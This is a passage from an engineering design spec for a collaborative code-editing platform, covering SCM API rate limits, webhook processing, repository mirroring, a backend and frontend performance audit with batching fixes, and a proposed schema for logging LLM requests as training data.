- **CI-triggered rapid pushes** → 20 pushes in 5 minutes → 20 tree fetches + 20 × hot-file prefetch. Manageable if prefetch is rate-limited.

**GitHub secondary limit (80 content-creating req/min)** is the tighter constraint for commits. At 8 calls per commit, max ~10 commits/minute. For interactive use this is never a problem. For automated agent commits, this needs throttling.

#### GitLab Rate Limits

GitLab is more generous for self-hosted (configurable, default quite high). GitLab.com:
- Default: 2,000 req/min per user (much higher than GitHub's 5,000/hr)
- Repository files API: 5 req/min for files >10MB (not relevant for code files)
- Write operations: No explicit secondary limit like GitHub's 80/min

**GitLab is not a rate-limit concern** for typical usage.

#### Bitbucket Rate Limits

- Bitbucket Cloud: 1,000 req/hr for authenticated users
- More restrictive than GitHub. Same caching strategy applies but the threshold for needing mirrors is lower (~15 concurrent users).

### 14.6 Webhook Processing: The Coordination Hub

The webhook handler is the most important new async task because it triggers a cascade:

```
SCM webhook: push event
    │
    ├── 1. Validate signature (sync, < 1ms)
    ├── 2. Look up repo_id + affected branches (Postgres, < 5ms)
    ├── 3. Update workspace_branches.head_commit (Postgres, < 5ms)
    │
    ├── 4. Materialize file tree (async):
    │      SCM API: GET /git/trees/{sha}?recursive=true
    │      → UPSERT file_tree_entries
    │      → Latency: 200ms (API) + 50ms (Postgres) = ~250ms
    │
    ├── 5. Warm content cache (async, low priority):
    │      For each file currently open in any Y.Doc:
    │        SCM API: GET /contents/{path}?ref={sha}
    │        → Redis PUT
    │      → Latency: 200ms × N files (parallelized, max 10 concurrent)
    │
    ├── 6. Enqueue search reindex (Postgres INSERT, < 5ms)
    │      → Picked up by existing search_indexer task
    │
    ├── 7. Emit SSE/WS events (async):
    │      → branch.updated { workspace_id, branch, new_sha }
    │      → file_tree.changed { workspace_id }
    │      → Clients refresh sidebar + re-seed open files
    │
    └── 8. Return 200 to SCM (should be < 10s total)
```

Steps 1-3 are synchronous in the HTTP handler (return 200 quickly). Steps 4-7 are spawned as `tokio::spawn` tasks from the handler — fire-and-forget with error logging. The webhook returns 200 after step 3; the SCM doesn't need to wait for tree materialization.

### 14.7 Would It Be Worth Mirroring Repos in the Future?

**For workers:** No. Workers already `git clone --depth=1` from the remote, which is fast enough (< 30s even for large repos, per §5.1). Workers are ephemeral — they clone at task start and discard at task end. The clone latency is amortized within the 30s cold-start budget.

**For g5-api (content serving):** Only at scale. Per §13.10-§13.11:

| Scale | Mirrors Needed? | Why |
|-------|----------------|-----|
| < 50 active repos | No | SCM API + Redis cache handles it |
| 50-200 active repos | Maybe | SCM API rate limits start to bite during bursts (search indexer, mass re-index) |
| > 200 active repos | Yes | Need local git access for search, blame, bulk operations |

**The phase-in path:**
1. **MVP:** No mirrors. SCM API backend + Redis cache. Ship fast.
2. **Scale phase:** Add `git_backend: "bare_mirror"` config option. The `GitContentService` already has a pluggable backend (§13.12). Deploying mirrors is a config + storage change, not a code change.
3. **Enterprise:** Bare mirrors are mandatory for air-gapped/self-hosted. These deployments already need local git.

**Worker mirroring (shared clone cache):** Could be useful if many workers clone the same repo in a short window. g5d already has L1/L2 cache (§14.2 item in g5d spec) — `clone.base_dir` holds bare clone caches for COW workspace creation. This is the worker-side equivalent and it's already specced.

### 14.8 Availability Considerations: What If the SCM API Is Down?

This is the "are we concerned about remote git APIs" question. If GitHub has an outage:

| Operation | Impact | Mitigation |
|-----------|--------|-----------|
| File content (L3 miss) | Can't load files not in Redis cache | Graceful degradation: show "content unavailable" with retry button. Files already cached: unaffected. Files already in Y.Doc: unaffected. |
| File tree | Can't refresh tree after push | Serve stale tree from Postgres (last known commit). |
| Draft commit | **Can't commit.** This is the critical path. | Queue the commit. Show "commit pending" in UI. Retry when SCM returns. The Y.Doc is not lost — draft is in Postgres. |
| Search indexer | Can't re-index new content | Queue entry stays in `search_reindex_queue`. Auto-retries. |
| Webhook | SCM can't send webhooks | Periodic poll fallback (already proposed in §13.5.3): every 5 min, check for new commits via SCM API. Also fails if API is down, but recovers automatically when API returns. |

**The key insight:** With the caching architecture from §13.10, a SCM API outage only affects **new content at new commits**. Everything already cached (Redis, Postgres file tree, Y.Docs in memory) continues to work. The system degrades gracefully — users can continue editing, viewing cached files, and queuing commits. When the SCM returns, everything flushes.

**For self-hosted with bare mirrors:** SCM API outage is irrelevant for reads (local git). Push (in `git push` to remote) is affected, but the commit is local. The user gets their commit SHA immediately; the push retries in the background.

### 14.9 Phasing: What to Build When

| Phase | Tasks | New Infrastructure | Dependencies |
|-------|-------|--------------------|-------------|
| **Phase 0: MVP** | CRDT compaction, draft cleanup, search indexer, usage aggregation, invitation GC, timeline cleanup, scheduler, worker scaler | None — already specced | Just generate the code |
| **Phase 1: Content Layer** | Webhook handler, file tree materialization, `GitContentService` with SCM API backend, Redis content cache | Redis content cache config, `file_tree_entries` migration, SCM API client | §13 spec changes |
| **Phase 2: Interactive** | Draft commit flush (SCM API path), CRDT seeding from git content, content cache warming | None new — builds on Phase 1 | §12 + §14.4 |
| **Phase 3: Scale** | Bare mirror support (`BareRepoBackend`), mirror fetch task, mirror GC | Disk storage for mirrors | Config flag, `git2` dependency |
| **Phase 4: Resilience** | Commit queue (retry on SCM outage), periodic poll fallback, circuit breaker for SCM API | Postgres commit queue table | SCM outage handling |

**Phase 0 is already specced and partially generated.** Phases 1-2 are the critical path for the UI to actually work. Phase 3-4 are scale/resilience.

### 14.10 Revised Spec Changes (Cumulative with §13.12)

| # | Spec File | Change | Phase |
|---|-----------|--------|-------|
| 1 | **NEW**: `g5/g5-api/services/scm_api_client.semlift.md` | Typed client for GitHub/GitLab/Bitbucket REST APIs. `create_blob()`, `create_tree()`, `create_commit()`, `update_ref()`, `get_file()`, `get_tree()`. Rate-limit-aware with token bucket + retry. | 1 |
| 2 | **NEW**: `g5/g5-api/services/git_content_service.semlift.md` | Unified read/write interface. Pluggable backend: `ScmApiBackend` (default) or `BareRepoBackend`. | 1 |
| 3 | **NEW**: `g5/g5-api/services/content_cache.semlift.md` | Redis content cache. `get_file(commit, path)`, `put_file(commit, path, content)`. | 1 |
| 4 | **NEW**: `g5/g5-api/routes/webhooks.semlift.md` | `POST /api/v1/webhooks/:provider`. Signature validation, cascade (tree materialization → cache warm → SSE → search queue). | 1 |
| 5 | **UPDATE**: `g5/g5-api/maintenance/mod.semlift.md` | Add webhook cascade tasks to `MaintenanceRunner` (or spawn from webhook handler directly). | 1 |
| 6 | **UPDATE**: `g5/g5-api/services/draft_service.semlift.md` | `commit_draft()` → SCM API Git Data flow (§14.4). No checkout needed. Fallback: `git2` on bare repo. | 2 |
| 7 | **UPDATE**: `g5/g5-api/crdt/authority.semlift.md` | Seed from `GitContentService.show_file()`. | 2 |
| 8 | **MIGRATION**: `file_tree_entries` | Schema from §13.12 item 9. | 1 |
| 9 | **UPDATE**: `g5/g5-api/config.semlift.md` | `git_backend`, `scm_api_rate_limit`, `content_cache_max_mb`, `mirror_dir`, `webhook_secret`. | 1 |
| 10 | **NEW** (Phase 3): `g5/g5-api/services/git_mirror_service.semlift.md` | Bare mirror management. Only needed for scale/self-hosted. | 3 |

### 14.11 Open Questions

46. **Should the draft commit be synchronous or async?** Synchronous: user clicks Commit, waits 1-3s, sees success. Async: user clicks Commit, gets "commit queued", sees success via WS event seconds later. **Recommendation: synchronous for MVP. The SCM API commit flow takes ~1-3s (4-8 API calls). That's acceptable for a button click. Async adds UX complexity (commit pending state, retry UI, queue visibility). Go async only if latency becomes a problem or for resilience against SCM outages.**

47. **GitLab's single-call commit API vs. GitHub's multi-call flow.** GitLab accepts `POST /projects/:id/repository/commits` with all file changes in one request. GitHub requires separate blob creation. Should the `ScmApiClient` abstract this? **Recommendation: yes. The `ScmApiClient` trait has one method: `commit_files(repo, branch, parent_sha, files, message, author) -> Result<CommitSha>`. Each provider implements it differently. GitLab: 1 call. GitHub: N+3 calls. Bitbucket: TBD.**

48. **Should content-creating API calls (blobs, trees, commits) use the user's OAuth token or an app installation token?** User token: rate limit is per-user (5K/hr), but the user "authored" the commit via the API so it shows as their commit. App token: rate limit is per-installation (5K-15K/hr), but commits show as authored by the app (can set `author` field to override on GitHub, not always on GitLab). **Recommendation: user's OAuth token. The per-user rate limit is sufficient, and the commit author attribution is correct.**

49. **What happens if the browser closes mid-commit?** The `POST /drafts/:id/commit` is a server-side operation. Once the server starts the SCM API calls, browser disconnect doesn't matter — the server completes the commit. The Y.Doc is reset on success, and the `branch.updated` event is emitted. If the user reconnects, they see the committed state. **No action needed — server-side operations are browser-independent.**

50. **Periodic poll fallback for missed webhooks — what interval?** §13.5.3 proposed 5min. But if a webhook is missed, users see stale content for 5 minutes. For "tracking" branches (auto-advance to remote HEAD), this might be acceptable. For active editing sessions, it's not. **Recommendation: 5min for "tracking" branches. For active workspaces with connected users: 30s poll if no webhook received in the last 60s. This is a cheap API call (`GET /repos/:owner/:repo/commits/:branch` → compare SHA with our `head_commit`).**

## §15 — Performance Audit: API Chattiness, DB Write Patterns, and Transactions

### 15.1 Summary Verdict

The architecture is **well-designed in structure** but has **specific hotspots** that will hurt at scale. The frontend data layer is solid (React Query, dual WebSocket, no polling). The backend has the right transaction boundaries but several services still do **loop-based individual INSERTs** where batch operations are needed. This section is a full inventory.

---

### 15.2 Frontend Data Layer — What's Good

The generation client (`generation/client/src/`) has a well-layered data architecture:

| Layer | Implementation | File |
|-------|---------------|------|
| HTTP Client | Singleton `ApiClient` with JWT auth, auto-refresh, request IDs, typed errors | `lib/api.ts` |
| Data Fetching | `@tanstack/react-query` v5 — all REST data goes through `useQuery`/`useMutation` hooks | `hooks/use*.ts` (20+ hooks) |
| Normalization | `toAsyncState()` / `toMutationHook()` wrappers → uniform `AsyncState<T>` output | `hooks/hookUtils.ts` |
| Event WebSocket | Single multiplexed WS (`/api/v1/ws`) with channel pub/sub, ref-counting, exponential backoff | `lib/ws.ts` |
| CRDT WebSocket | Separate Yjs `WebsocketProvider` per (workspace, branch) pair, singleton store with ref-counting | `lib/crdt.ts` |

**Key strengths:**
- **No polling** — all real-time updates come via WebSocket events → React Query cache invalidation
- **Optimistic updates** on chat send, comment add/resolve, with proper rollback
- **Chat streaming** uses `setQueryData()` for O(1) chunk appends (not full invalidation)
- **Reference-counted WS channels** prevent subscribe/unsubscribe churn on re-renders
- **CRDT ref-counting** with 2s grace period avoids Yjs provider teardown on tab switches
- **AbortSignal** passed to all queries for automatic cancellation on unmount
- **Single HTTP client** — no scattered `fetch()` calls in components
- **Infinite query** pagination for task timeline

---

### 15.3 Frontend — Chattiness Issues

#### Issue 1: Slug Resolution Fetches Full Workspace List — **HIGH**

`useResolveWorkspaceSlug` (`hooks/useWorkspace.ts`) fetches `GET /api/v1/orgs/:org/workspaces` (the **entire workspace list**) just to resolve a URL slug → UUID. There's a TODO in the code acknowledging this:

> *"Replace with a dedicated `GET /api/v1/orgs/:org/workspaces/by-name/:name` backend endpoint."*

Every workspace page load downloads the full list. With 50+ workspaces per org, this is wasted bandwidth and DB load on every navigation.

**Fix:** Add `GET /api/v1/orgs/:org/workspaces/by-slug/:slug` → single-row query. Trivial backend change, eliminates the largest unnecessary payload on every page load.

#### Issue 2: 10-13 Parallel REST Calls on Workspace Page Load — **MEDIUM**

When `WorkspacePage` mounts, it fires these queries simultaneously:

| # | Hook | Endpoint |
|---|------|----------|
| 1 | `useResolveWorkspaceSlug` | `GET /orgs/:org/workspaces` (full list!) |
| 2 | `useWorkspace` | `GET /workspaces/:id` |
| 3 | `useOntologyRoots` | `GET /branches/:branchId/ontology` |
| 4 | `useWorkspaceJobs` | `GET /workspaces/:id/jobs` |
| 5 | `useWorkspaceWorkers` | `GET /workspaces/:id/workers` |
| 6 | `useFileTree` | `GET /branches/:branchId/files` |
| 7 | `useDraftSession` | `GET /branches/:branchId/draft` |
| 8 | `useChatSessions` | `GET /workspaces/:id/chat/sessions` |
| 9 | WebSocket subscribe | `workspace:<id>` channel |
| 10+ | `useNodeContent` | `GET /ontology/:nodeId/content` (per active tab) |

React Query deduplicates identical keys, and these fire in parallel (good), but this is **10+ TCP-level requests** unless HTTP/2 is in play. Each request also carries JWT auth overhead.

**Mitigation options (choose one):**
- **A. Hydration endpoint:** `GET /api/v1/workspaces/:id/hydrate` returns workspace + ontology roots + jobs + workers + draft + chat sessions + file tree in a single response. This is the "BFF" pattern — one round-trip, one auth check, one DB transaction.
- **B. HTTP/2 multiplexing:** If the API is behind a reverse proxy that supports HTTP/2 (which it should be), the 10 requests share a single TCP connection and the overhead is modest. The real cost is 10 DB query sets, which are all fast.
- **C. Do nothing for now.** These are all cached after the first load. Subsequent navigations hit React Query's cache. This only matters on cold load, where the user expects a brief loading state anyway.

**Recommendation: Option A (hydration endpoint) for shipped product. Option C is acceptable for MVP/demo.** HTTP/2 handles the network side; the real benefit of hydration is reducing server-side query count from ~10 independent handler invocations to 1 function with shared DB connection.

#### Issue 3: Tab Switches Trigger Background Refetches — **LOW-MEDIUM**

`ContentDispatch` re-renders on every tab switch, calling `useNodeContent`, `useNodeComments`, `useNodeDiff`, `useFileContent`. With the default `staleTime: 0`, React Query marks cached data as stale immediately and refetches in the background.

**Fix:** Set `staleTime: 30_000` (30s) for content that's already backed by WebSocket cache invalidation. If the server pushes `draft.update` or `comment.new` events, React Query already invalidates the right keys — no need for the background refetch.

#### Issue 4: Overly Broad Cache Invalidation — **LOW-MEDIUM**

Several mutations invalidate more cache entries than necessary:
- `useCommitDraft` invalidates ALL `['draft-session']` and ALL `['ontology']` queries, not just the current branch/workspace
- Job mutations (`usePauseJob`, `useResumeJob`, `useCancelJob`) invalidate ALL `['jobs']` without scoping to workspace
- `useResolveComment` iterates all comment queries in the cache to find the one containing the target comment ID

**Fix:** Scope invalidation keys: `['jobs', workspaceId]`, `['draft-session', branchId]`, `['ontology', branchId]`. This prevents cross-workspace cache thrashing when a user has multiple workspaces open in different tabs.

#### Issue 5: Dual WebSocket Ticket Acquisition — **LOW**

Both the multiplexed event WS (`App.tsx`) and the CRDT WS (`crdt.ts`) independently call `POST /api/v1/auth/ws-ticket`. If both connect simultaneously on page load, that's 2 POST requests for tickets that could be shared.

**Fix:** Make the WebSocket ticket service a shared singleton in the data layer that deduplicates concurrent requests.

---

### 15.4 Backend — Connection Pool Configuration

Single shared `PgPool` (`db/mod.rs`):

| Setting | Default | Env Override |
|---------|---------|-------------|
| `max_connections` | **20** | `G5_DATABASE_MAX_CONNECTIONS` |
| `min_connections` | **5** | `G5_DATABASE_MIN_CONNECTIONS` |
| `connect_timeout` | **30s** | `G5_DATABASE_CONNECT_TIMEOUT_SECS` |
| `idle_timeout` | **600s** | `G5_DATABASE_IDLE_TIMEOUT_SECS` |

20 connections is reasonable for a single instance. But with the N+1 write patterns below, a single `submit_task_graph` call can hold a connection for hundreds of milliseconds of sequential INSERTs, starving other requests at high concurrency.

---

### 15.5 Backend — Transaction Usage (Full Inventory)

The codebase has **29 explicit transactions across 12 service files**. Here are the critical ones:

| Service | Method | Queries in Tx | Pattern Quality |
|---------|--------|---------------|-----------------|
| `clone_service` | `clone_workspace` | ~15+ | **Excellent** — multi-row batch INSERTs (100-200 rows), `UNNEST()` for bulk UPDATE |
| `job_service` | `create_job` | 2 | Good — job + bootstrap task |
| **`job_service`** | **`submit_task_graph`** | **N+2** | **Bad — loop INSERT per task** |
| `org_service` | `create_org` | 6 | Good — all related entities atomically |
| **`spend_service`** | **`record_usage`** | **up to 4N** | **Bad — per-record INSERT + conditional UPDATEs** |
| `chat_service` | `send_message` | 4-5 | Good — msg pair + session update |
| **`chat_service`** | **`fork_session`** | **N+3** | **Bad — loop INSERT per copied message** |
| `ontology_service` | `create_node` | 4 | Good — validate + write |
| **`ontology_service`** | **`batch_update_staleness`** | **N** | **Bad — named "batch" but loops individual UPDATEs** |
| `draft_service` | `commit_draft` | 7 | **Excellent** — `FOR UPDATE` row lock, CAS-based optimistic concurrency |
| `draft_service` | `discard_draft` | 3 | Good |
| `crdt/persistence` | `compact` | 4 | Good — `FOR UPDATE` prevents concurrent compaction |
| `permission_service` | `set_*_scopes` (3 methods) | N+1 each | Acceptable — N is typically 5-20 |
| `workspace_service` | `create_workspace` | variable | Good overall, small loop for deps |
| `auth_service` | `import_repos` | 2N | Medium concern — SELECT+INSERT per repo on initial import |

---

### 15.6 Backend — N+1 Write Patterns (Severity-Ranked)

#### HIGH — Must fix before production scale

**1. `job_service::submit_task_graph`** (`services/job_service.rs` ~L347-370)

```
for task in &task_graph.tasks {
    sqlx::query!("INSERT INTO tasks (...) VALUES ($1, $2, ...)", ...)
        .execute(&mut *tx).await?;
}
sqlx::query!("UPDATE jobs SET status = 'running' WHERE id = $1", job_id)
    .execute(&mut *tx).await?;
```

A 100-task DAG = **102 roundtrips** within a single transaction. The `clone_service` already demonstrates the fix — multi-row `INSERT ... VALUES ($1,$2,...), ($N,$N+1,...)` with dynamic parameterization, batching 100 rows per INSERT.

**Impact:** Called on every job submission. Task graphs can have 10-200+ tasks. At 1-2ms per roundtrip, a 100-task submit takes 100-200ms of connection hold time. With 20 pool connections and concurrent users, this becomes a bottleneck.

**Fix:** Multi-row INSERT with batch size 100, matching `clone_service` pattern:
```sql
INSERT INTO tasks (id, job_id, node_id, kind, status, ...)
VALUES ($1,$2,$3,$4,$5,...), ($6,$7,$8,$9,$10,...), ...
```

**2. `spend_service::record_usage`** (`services/spend_service.rs` ~L614-700)

Per-record: INSERT into `usage_records` + conditional UPDATE on `tasks.token_count` + conditional UPDATE on `jobs.total_cost` + conditional UPDATE on `chat_sessions.token_count`. Up to **4 queries per usage record**.

Workers batch-report usage every few seconds. A batch might be 10-50 records.

**Fix:** 
- Multi-row INSERT for `usage_records`
- Aggregate by `task_id` and `job_id` before updating counters: one UPDATE per unique task, not per record
- `UPDATE tasks SET token_count = token_count + $2 WHERE id = $1` with aggregated sums

**3. `search_service::full_reindex`** (`services/search_service.rs` ~L528-615)

Individual UPSERT per file **without a wrapping transaction**. A 500-file workspace = 500 individual queries, and a failure mid-way leaves a partially-indexed workspace.

**Fix:** Wrap in transaction + batch UPSERT via `INSERT ... FROM UNNEST(...) ON CONFLICT DO UPDATE`.

#### MEDIUM — Should fix for production

**4. `ontology_service::batch_update_staleness`** (`services/ontology_service.rs` ~L960-1000)

Despite the method name containing "batch", it loops individual UPDATEs:
```
for (node_id, staleness) in &updates {
    sqlx::query!("UPDATE ontology_nodes SET staleness = $2 WHERE id = $1", ...)
        .execute(&mut *tx).await?;
}
```

Called after task completion to propagate staleness up the dependency graph. Can affect 10-50 nodes.

**Fix:** `UPDATE ontology_nodes SET staleness = t.staleness FROM UNNEST($1::uuid[], $2::text[]) AS t(id, staleness) WHERE ontology_nodes.id = t.id`

**5. `chat_service::fork_session`** (`services/chat_service.rs` ~L991-1019)

Copies messages one-by-one. A 100-message conversation fork = 103 queries.

**Fix:** Multi-row INSERT. Also consider `INSERT INTO chat_messages (...) SELECT ... FROM chat_messages WHERE session_id = $1 AND sequence <= $2` to avoid even reading messages into Rust memory.

**6. `auth_service::import_repos`** (`services/auth_service.rs` ~L1097-1182)

SELECT + INSERT per repository during initial GitHub/GitLab sync. A user with 50 repos = 100 queries.

**Fix:** `SELECT id FROM repositories WHERE remote_id = ANY($1)` (single query to find existing), then batch INSERT for the new ones.

#### LOW — Acceptable for now

| Pattern | Location | Typical N | Why it's OK |
|---------|----------|-----------|-------------|
| `permission_service::set_*_scopes` | 3 methods | 5-20 | Admin-only, rare operation |
| `workspace_service::set_dependencies` | deps loop | 0-5 | Small N by design |
| `org_service::accept_all_invitations` | membership per invite | 1-5 | Rare, bounded |
| `scheduler/scaling::provision_workers` | INSERT per worker | 1-5 | Small, infrequent |

---

### 15.7 Backend — Good Patterns (Clone Service as Exemplar)

`clone_service.rs` demonstrates all the right techniques:

| Technique | Lines | Description |
|-----------|-------|-------------|
| Multi-row INSERT | ~L382-465 | `INSERT INTO ontology_nodes VALUES (...), (...), ...` with batch size 100 |
| `UNNEST()` bulk UPDATE | ~L473-490 | `UPDATE ontology_nodes SET parent_id = t.new_id FROM UNNEST($1::uuid[], $2::uuid[]) AS t(old_id, new_id)` |
| Multi-row INSERT | ~L522-560 | `node_dependencies` with batch size 200 |
| Multi-row INSERT | ~L670-696 | `doc_node_links` with batch size 200 |
| Full wrapping transaction | ~L172-755 | Everything in one tx — rollback is atomic |

**Every service with loops should follow this pattern.** The infrastructure for dynamic multi-row INSERT parameterization already exists in the codebase.

---

### 15.8 Backend — Missing Transactions

| Location | Issue | Severity |
|----------|-------|----------|
| `search_service::full_reindex` | N individual UPSERTs + final DELETE without a transaction. Partial failure = inconsistent search index. | **Medium** |
| `comment_service::add_reply` | INSERT reply + UPDATE parent `updated_at` are two separate non-transactional queries. Reply could exist with stale parent timestamp. | **Low** |
| `crdt/persistence::persist_update` | INSERT + UPDATE intentionally non-transactional (documented). INSERT is the critical path; UPDATE is bookkeeping. | **Intentional — acceptable** |

---

### 15.9 Quantified Impact Assessment

Assuming a moderately active workspace with 20 concurrent users, 5 active jobs, ~200 ontology nodes:

| Operation | Current Cost | After Fix | Frequency |
|-----------|-------------|-----------|-----------|
| `submit_task_graph` (50 tasks) | 52 queries, ~75ms | 2 queries, ~3ms | Per job submit |
| `record_usage` (20 records) | 80 queries, ~120ms | 5-8 queries, ~12ms | Every 5-10s per worker |
| `full_reindex` (300 files) | 300 queries, ~450ms, no tx | 3-4 queries, ~15ms, in tx | On push webhook |
| `batch_update_staleness` (30 nodes) | 30 queries, ~45ms | 1 query, ~2ms | After task completion |
| `fork_session` (100 messages) | 103 queries, ~150ms | 2 queries, ~5ms | User-initiated, rare |
| Page load REST calls | 10-13 requests | 1-3 requests | Every navigation |

**Connection pool pressure:** With the current patterns, a burst of 5 concurrent job submissions + 3 workers reporting usage could consume 8+ connections for 100-200ms each, leaving only 12 for all other API traffic. After batching, the same burst holds connections for <10ms each.

---

### 15.10 Recommended Priority

| Priority | Fix | Effort | Impact |
|----------|-----|--------|--------|
| **P0** | `submit_task_graph` → batch INSERT | 2-3 hours | Eliminates worst N+1, unblocks concurrent job submissions |
| **P0** | `record_usage` → batch INSERT + aggregated counter UPDATEs | 3-4 hours | Most frequent write path in the system |
| **P1** | `full_reindex` → tx + batch UPSERT | 2 hours | Correctness fix (missing tx) + perf |
| **P1** | `batch_update_staleness` → `UNNEST()` UPDATE | 1 hour | Easy win, pattern already in clone_service |
| **P1** | Workspace slug resolution → dedicated endpoint | 1 hour | Eliminates largest unnecessary payload |
| **P2** | `fork_session` → batch or SQL-level copy | 1 hour | Low frequency but easy fix |
| **P2** | `staleTime` tuning for tab-switch refetches | 30 min | Frontend-only, trivial |
| **P2** | Scoped cache invalidation keys | 1 hour | Frontend-only, prevents cross-workspace thrash |
| **P3** | Hydration endpoint for page load | 4-6 hours | Nice-to-have for shipped product, not needed for demo |
| **P3** | `import_repos` → batch | 1 hour | One-time per user, low frequency |

### 15.11 Open Questions

51. **Should we add a hydration endpoint or rely on HTTP/2 multiplexing?** The 10-13 parallel queries on page load are individually fast (<20ms each), and HTTP/2 multiplexes them over one TCP connection. The main benefit of hydration is reducing server-side handler overhead (auth checks, pool checkouts) from 10 to 1. **Recommendation: defer until we measure actual page-load latency. If it's under 200ms total, HTTP/2 is sufficient.**

52. **Should `record_usage` be write-behind instead of write-through?** Currently, workers report usage, and the API inserts immediately. An alternative: buffer usage records in Redis (or an in-process queue) and flush to Postgres every 5-10s in a batch. This further reduces connection pressure but adds a small window of potential data loss on crash. **Recommendation: write-through with batched INSERT for now. Write-behind only if Postgres becomes a bottleneck, which the batching fixes should prevent.**

53. **Pool sizing for horizontal scaling.** With 20 max connections per API instance, 3 instances = 60 connections to Postgres. The default Postgres `max_connections` is 100. If we scale to 5+ instances, we'll need PgBouncer or reduce per-instance pool size. **Recommendation: document the constraint. For MVP, single instance with 20 connections is fine. For production, add PgBouncer (or Supavisor if using Supabase).**

## §16 — Data Signals, Desync Tracking, Demo Viability, and Batch Jobs

Four questions addressed in this section:
1. Are we retaining dialog/edit histories as training data signals?
2. Do we need to track/visualize CRDT desync between workers and UI?
3. Is the connected-worker-only experience sufficient for a demo?
4. How does a user trigger batch uplift/downlift across multiple stale nodes?

---

### 16.1 Data Signal Retention — What We Keep, What We Lose, What We Should Capture

#### 16.1.1 Current Retention Inventory

| Data Signal | Storage | Retention | Training Value |
|-------------|---------|-----------|----------------|
| Chat message content | `chat_messages` | **Permanent** | HIGH — user↔LLM dialog pairs |
| Chat session metadata (title, summary, tags, linked nodes/commits) | `chat_sessions` | **Permanent** | HIGH — session-level context |
| Per-message token counts & artifacts/citations | `chat_messages` | **Permanent** | MEDIUM — cost analysis |
| Fork lineage (forked_from, forked_at_index) | `chat_sessions` | **Permanent** | MEDIUM — conversation branching patterns |
| Task timeline (thought, tool_call, tool_result, output, error, user_message) | `timeline_entries` | **30 days**, then pruned to last 100/task | HIGH — agent behavior traces |
| Task checkpoints (commit_sha, files_changed, stats) | `task_checkpoints` | **Permanent** | MEDIUM — output quality tracking |
| Usage records (provider, model, tokens, cost, duration, finish_reason) | `usage_records` | **Permanent** | MEDIUM — model performance analysis |
| CRDT incremental edits | `draft_updates` | **Temporary** — deleted on compaction/commit/discard | LOW after compaction |
| CRDT compacted snapshot | `draft_sessions.yjs_state` | **Temporary** — deleted on commit/discard | LOW — final state only |
| Draft dirty files / diff summary | `draft_sessions` | **Temporary** — deleted on commit/discard | MEDIUM — what changed |

#### 16.1.2 Critical Gaps — Data We're Losing

**Gap 1: Assembled LLM Prompts — THE biggest loss.** We store the user message and assistant response, but NOT the full context window sent to the model (system prompt, injected file contents, tool definitions, ontology context). This is the #1 signal needed for prompt engineering, fine-tuning, and debugging model behavior. After a task completes, we cannot reconstruct what the model actually saw.

**Gap 2: Dialog Compaction Segments.** g5d's `LSMDialogCompactor` (`g5d/src/agent/compaction.rs`) already captures pre-compaction conversation segments in memory — these are literally ready-made (long_conversation → summary) training pairs. But they're **never persisted** — lost when the worker process exits.

**Gap 3: CRDT Edit Attribution.** Yjs updates are opaque binary blobs with no metadata about who authored them. After compaction, individual edit granularity is lost entirely. We cannot answer "what did the agent write vs. what did the human write?" — which is essential for measuring agent output quality and human override patterns.

**Gap 4: Message Send Context.** `SendMessageRequest.context` (selected node IDs, file ranges, task scope) is consumed at send-time but NOT stored on the `chat_messages` row. We lose the signal of what context users provide when chatting.

**Gap 5: User Intervention Reasoning.** When a user pauses/resumes/injects/aborts a task, only the status transition is recorded. The *why* — what the user saw that made them intervene — is never captured.

**Gap 6: Pre-Discard Draft Snapshots.** When a user discards a draft, ALL edits are permanently lost with zero trace. These are valuable "what didn't work" signals — the user wrote something, decided it was wrong, and threw it away.

**Gap 7: Audit/Action Log.** No record of who modified workspace settings, who triggered which jobs, who approved/rejected changes. Zero analytics, zero telemetry, zero feature usage metrics.

#### 16.1.3 Recommended Data Capture Additions

| Priority | Signal | Where to Add | Storage Cost | Training Value |
|----------|--------|-------------|-------------|----------------|
| **P0** | Full LLM request payload (system prompt + context + tools) | New `llm_request_log` table, or JSONB column on `chat_messages` / `timeline_entries` | ~5-50KB per request (compressible) | Essential for fine-tuning |
| **P0** | Dialog compaction segments | Persist g5d's `segments` via existing timeline API as `event_type = 'compaction_snapshot'` | ~2-10KB per compaction | Free training pairs |
| **P1** | Message send context | Add `context JSONB` column to `chat_messages` | ~200B per message | Context selection patterns |
| **P1** | CRDT edit attribution | Wrap Yjs updates with `(user_id, timestamp, byte_range)` metadata before persisting to `draft_updates` | ~50B overhead per update | Agent vs. human authorship |
| **P2** | Pre-discard draft archive | Before `DELETE`, copy `yjs_state` to `draft_archives` table with `workspace_id`, `discarded_by`, `discarded_at` | Variable (same as draft) | "What didn't work" signal |
| **P2** | User intervention context | Add `reason TEXT` field to task state transition API | ~100B per intervention | Failure mode classification |
| **P2** | Audit log | New `audit_log` table: `(user_id, action, resource_type, resource_id, metadata JSONB, created_at)` | ~200B per event | Security + workflow analysis |
| **P3** | Timeline retention extension | Increase from 30d to 90d, or archive to cold storage (S3/GCS) instead of deleting | ~1KB per entry × volume | Historical agent behavior |

#### 16.1.4 LLM Request Logging — Proposed Schema

This is the single highest-value addition:

```sql
CREATE TABLE llm_request_log (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    -- Linkage (at least one non-null)
    task_id         UUID REFERENCES tasks(id),
    chat_session_id UUID REFERENCES chat_sessions(id),
    message_id      UUID REFERENCES chat_messages(id),
    
    -- Request
    provider        TEXT NOT NULL,          -- 'anthropic', 'openai', etc.
    model           TEXT NOT NULL,          -- 'claude-sonnet-4-20250514', etc.
    system_prompt   TEXT,                   -- full system prompt
    messages        JSONB NOT NULL,         -- full message array as sent
    tools           JSONB,                  -- tool definitions
    parameters      JSONB,                  -- temperature, top_p, etc.
    
    -- Response
    completion      TEXT,                   -- raw response text
    tool_calls      JSONB,                  -- tool call array if any
    finish_reason   TEXT,                   -- 'stop', 'tool_use', 'max_tokens'
    
    -- Metrics
    input_tokens    INTEGER,
    output_tokens   INTEGER,
    cache_read_tokens  INTEGER DEFAULT 0,
    cache_write_tokens INTEGER DEFAULT 0,
    duration_ms     INTEGER,
    
    created_at      TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- Partition by month for efficient retention management
-- Index on (task_id), (chat_session_id) for lookups
```

**Retention:** 90 days in Postgres, then archive to object storage (Parquet format for training pipeline consumption). At ~20KB per request × 1000 requests/day = ~20MB/day, this is trivially storable.

**Privacy:** LLM request logs may contain user code and proprietary data. Must be tenant-scoped and respect data deletion requests. Self-hosted deployments can opt out.

---

### 16.2 CRDT Desync Tracking — Do We Need It?

**Short answer: We already have it. The architecture handles desync well. A few small additions would complete the picture.**

#### 16.2.1 What Exists Today

The CRDT sync architecture is a three-party system:

```
  UI Client (Browser)          g5-api (Authority)            g5d Worker
